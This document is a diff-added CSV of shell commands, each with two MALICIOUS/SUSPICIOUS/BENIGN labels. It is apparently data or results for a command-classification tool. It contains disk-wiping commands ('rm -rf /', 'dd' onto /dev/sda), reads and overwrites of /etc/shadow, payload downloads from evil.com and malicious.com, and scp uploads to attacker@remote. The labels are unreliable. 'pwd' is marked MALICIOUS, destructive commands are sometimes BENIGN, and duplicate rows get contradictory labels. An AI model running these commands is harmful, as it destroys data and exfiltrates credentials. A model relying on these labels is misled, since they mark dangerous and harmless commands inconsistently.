+pwd,MALICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+netstat -tulnp,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+cat   /var/log/auth.log,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
+curl -O http://suspicious.org/update.bin,SUSPICIOUS,MALICIOUS
+curl -O   http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,SUSPICIOUS
+sudo -l,SUSPICIOUS,BENIGN
+LS /VAR/WWW,SUSPICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+sudo apt   update,BENIGN,SUSPICIOUS
+cat welcome.txt,BENIGN,SUSPICIOUS
+whoami,SUSPICIOUS,MALICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,MALICIOUS
+CAT /ETC/SHADOW ,SUSPICIOUS,BENIGN
+ls   -al,BENIGN,SUSPICIOUS
+SCP BACKUP.SQL ADMIN@192.168.0.2:/ROOT/,BENIGN,MALICIOUS
+rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
+ps aux,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,SUSPICIOUS
+grep root /etc/passwd,MALICIOUS,BENIGN
+cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+ECHO 'HELLO WORLD',SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,SUSPICIOUS
+echo 'owned' > /var/log/syslog,MALICIOUS,BENIGN
+PS AUX | GREP MYSQL,SUSPICIOUS,BENIGN
+du -sh,BENIGN,MALICIOUS
+SCP   FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS,BENIGN
+history,MALICIOUS,SUSPICIOUS
+ps aux | grep sshd,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+scp file.txt admin@192.168.0.2:/tmp/,MALICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+WGET   HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
+curl -o   http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+cat   homework.txt,MALICIOUS,BENIGN
+WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+WGET   HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS,BENIGN
+iptables -f ,MALICIOUS,BENIGN
+PS AUX ,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,MALICIOUS
+SUDO -L,SUSPICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
+chmod 777   /root/.bashrc,MALICIOUS,SUSPICIOUS
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,SUSPICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+curl https://fileshare.com/update.bin ,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+echo 'owned'   >> /var/log/syslog,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+CAT /HOME/USER/TODO.TXT,BENIGN,SUSPICIOUS
+ls /tmp/,SUSPICIOUS,BENIGN
+wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+echo 'hello world' ,BENIGN,MALICIOUS
+wget http://evil.com/payload.sh,BENIGN,SUSPICIOUS
+ls -al,SUSPICIOUS,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,SUSPICIOUS,MALICIOUS
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,SUSPICIOUS
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+cat   /home/user/info.txt,SUSPICIOUS,BENIGN
+GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
+sudo apt   update,BENIGN,MALICIOUS
+grep   'password' /etc/passwd,SUSPICIOUS,BENIGN
+ cat /etc/passwd,SUSPICIOUS,MALICIOUS
+cd /tmp/ ,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+ls   /root/,BENIGN,SUSPICIOUS
+echo 'pwned' > /root/.bashrc,MALICIOUS,SUSPICIOUS
+sudo   su,SUSPICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,BENIGN,SUSPICIOUS
+echo 'hello world',MALICIOUS,SUSPICIOUS
+echo 'hello world' ,BENIGN,MALICIOUS
+curl -O   http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+GREP   ROOT /ETC/PASSWD,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+GREP   ROOT /ETC/PASSWD,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+ls   -al,SUSPICIOUS,BENIGN
+PS AUX   | GREP SSHD,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+chmod 777 /etc/shadow ,SUSPICIOUS,MALICIOUS
+echo 'malware' > /tmp/malware.sh,BENIGN,SUSPICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+scp data.tar.gz user@192.168.0.2:/var/www,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts ,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
+netstat -tulnp,SUSPICIOUS,BENIGN
+ CAT WELCOME.TXT,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,MALICIOUS
+which python,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
+grep root /etc/passwd,MALICIOUS,BENIGN
+CAT /HOME/USER/INFO.TXT,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+CAT /ETC/SHADOW,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,SUSPICIOUS
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,MALICIOUS
+netstat   -tulnp,MALICIOUS,SUSPICIOUS
+echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+ECHO 'MALWARE'   > /TMP/MALWARE.SH,MALICIOUS,SUSPICIOUS
+curl -O http://evil.com/update.bin,MALICIOUS,BENIGN
+ps aux | grep nginx,SUSPICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+ls /var/www ,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+ ps aux | grep nginx,BENIGN,SUSPICIOUS
+echo 'owned' > /etc/shadow,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+ifconfig ,SUSPICIOUS,BENIGN
+ curl -O http://malicious.com/malware.bin,SUSPICIOUS,MALICIOUS
+cat welcome.txt,SUSPICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+wget http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+wget http://fileshare.com/update.bin ,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,SUSPICIOUS
+chmod 777   /var/log/syslog,MALICIOUS,SUSPICIOUS
+sudo apt install htop,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,SUSPICIOUS
+echo 'hello',SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,MALICIOUS
+curl -O http://suspicious.org/update.bin,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+CAT /ETC/PASSWD,MALICIOUS,BENIGN
+curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat /var/log/auth.log ,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+du   -sh,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+LS /ROOT/,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+ps aux | grep   mysql,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,SUSPICIOUS
+pwd,BENIGN,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+which python,MALICIOUS,SUSPICIOUS
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+CD /VAR/WWW,BENIGN,MALICIOUS
+cat .bashrc,SUSPICIOUS,MALICIOUS
+cat .bashrc,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
+curl   -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+cat   /var/log/auth.log,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,SUSPICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,MALICIOUS
+ECHO 'HACKED' >   /ROOT/.BASHRC,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
+rm -rf /var/,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,BENIGN,MALICIOUS
+ls /tmp/,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,SUSPICIOUS
+curl -O http://fileshare.com/payload.sh ,MALICIOUS,BENIGN
+echo   'pwned' > /etc/shadow,BENIGN,MALICIOUS
+top -n 1 ,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+cat   homework.txt,SUSPICIOUS,MALICIOUS
+wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+PS AUX | GREP NGINX,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
+iptables -F,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,SUSPICIOUS
+cat homework.txt,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+GREP 'PASSWORD'   /ETC/PASSWD,SUSPICIOUS,BENIGN
+CAT /ETC/SHADOW,MALICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+cat /etc/shadow ,MALICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,BENIGN,MALICIOUS
+curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+echo 'owned' >> /root/.bashrc,BENIGN,SUSPICIOUS
+cd /root,MALICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+rm -rf /home/user,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
+grep   root /etc/passwd,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,SUSPICIOUS
+wget   http://evil.com/exploit.zip,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,SUSPICIOUS
+sudo apt install nmap,BENIGN,MALICIOUS
+history,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,MALICIOUS
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+ curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+scp data.tar.gz admin@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh,MALICIOUS,BENIGN
+SUDO APT INSTALL HTOP,BENIGN,MALICIOUS
+CD /VAR/WWW,SUSPICIOUS,BENIGN
+scp data.tar.gz user@malicious.com:/root/,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+SUDO APT UPDATE,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+echo 'hacked'   >> /root/.bashrc,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+ chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+curl   -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
+curl -O http://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+cat /home/user/info.txt ,MALICIOUS,BENIGN
+iptables -F,BENIGN,MALICIOUS
+sudo apt install nmap,SUSPICIOUS,BENIGN
+ curl https://evil.com/update.bin,MALICIOUS,BENIGN
+ECHO 'HACKED' > /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh ,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+ curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+WATCH NETSTAT -AN ,MALICIOUS,BENIGN
+cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
+uname -a ,BENIGN,MALICIOUS
+CAT WELCOME.TXT,SUSPICIOUS,BENIGN
+top -n 1,BENIGN,SUSPICIOUS
+chmod   777 /var/log/syslog,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+echo 'owned'   >> /root/.bashrc,SUSPICIOUS,BENIGN
+ifconfig ,SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
+watch netstat -an,SUSPICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+df -h,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,BENIGN,SUSPICIOUS
+sudo apt install htop,BENIGN,SUSPICIOUS
+history,SUSPICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+top   -n 1,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+rm -rf   /,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
+rm -rf /,MALICIOUS,BENIGN
+NETSTAT   -TULNP,MALICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+echo 'owned' > /etc/shadow,SUSPICIOUS,BENIGN
+cd /tmp/,BENIGN,SUSPICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc ,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+scp backup.sql admin@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+wget http://suspicious.org/update.bin,BENIGN,MALICIOUS
+watch netstat -an,MALICIOUS,SUSPICIOUS
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+SUDO   APT UPDATE,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+find   / -name 'test',BENIGN,SUSPICIOUS
+ls /var/www,MALICIOUS,BENIGN
+ls   /root/,MALICIOUS,SUSPICIOUS
+ps aux,BENIGN,SUSPICIOUS
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip,BENIGN,SUSPICIOUS
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+touch homework.doc,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+CURL   -O HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,SUSPICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+watch netstat -an,BENIGN,MALICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,MALICIOUS
+rm -rf /var/,MALICIOUS,SUSPICIOUS
+wget   http://malicious.com/payload.sh,BENIGN,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+cat   /home/user/todo.txt,SUSPICIOUS,MALICIOUS
+wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
+rm   -rf /* --no-preserve-root,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+sudo apt install net-tools,BENIGN,MALICIOUS
+ cat /etc/passwd,MALICIOUS,SUSPICIOUS
+env,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+echo 'hacked' > /etc/shadow,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+curl   https://evil.com/payload.sh,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,SUSPICIOUS
+NETSTAT -TULNP,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+LS   /ROOT/,BENIGN,MALICIOUS
+scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+curl   https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+cat /etc/passwd ,MALICIOUS,BENIGN
+cat notes.txt ,MALICIOUS,SUSPICIOUS
+cat notes.txt,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+echo   'hello',SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+chmod 777   /root/.bashrc,MALICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+chmod   777 /var/log/syslog,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,BENIGN,MALICIOUS
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,MALICIOUS
+echo   'hello',SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
+cd /root,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,MALICIOUS
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip ,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,MALICIOUS
+find / -name 'test',MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+PS AUX | GREP NGINX,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash ,BENIGN,MALICIOUS
+CAT /ETC/SHADOW,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
+grep root   /etc/passwd,MALICIOUS,SUSPICIOUS
+which   python,MALICIOUS,BENIGN
+scp file.txt root@backup.server:/root/,MALICIOUS,BENIGN
+which python,SUSPICIOUS,MALICIOUS
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,SUSPICIOUS
+top   -n 1,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+rm -rf   /home/user,SUSPICIOUS,BENIGN
+cd   /root/,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,SUSPICIOUS
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
+ps aux | grep sshd,MALICIOUS,BENIGN
+ chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+which python,SUSPICIOUS,MALICIOUS
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+mkdir   test,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+cat readme.md,MALICIOUS,BENIGN
+cd /root/,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,BENIGN,SUSPICIOUS
+ CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
+echo 'malware' >   /tmp/malware.sh,SUSPICIOUS,MALICIOUS
+ls /var/www,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+sudo apt install net-tools ,MALICIOUS,BENIGN
+iptables   -F,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+SUDO   -L,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
+rm -rf /home/user,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,SUSPICIOUS
+ls /root/,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,BENIGN,SUSPICIOUS
+sudo   -l,MALICIOUS,BENIGN
+echo 'pwned' >   /var/log/syslog,SUSPICIOUS,BENIGN
+SUDO   APT INSTALL NET-TOOLS,MALICIOUS,SUSPICIOUS
+rm -rf /var/,SUSPICIOUS,BENIGN
+cd   /var/www,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+grep 'password'   /etc/passwd,MALICIOUS,SUSPICIOUS
+top -n 1,SUSPICIOUS,MALICIOUS
+grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+ wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
+PWD,MALICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+ chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+scp backup.sql root@malicious.com:/root/,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+echo 'pwned'   >> /var/log/syslog,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,SUSPICIOUS
+TOP -N 1,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,MALICIOUS
+echo 'hacked'   > /root/.bashrc,SUSPICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+curl   -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,SUSPICIOUS
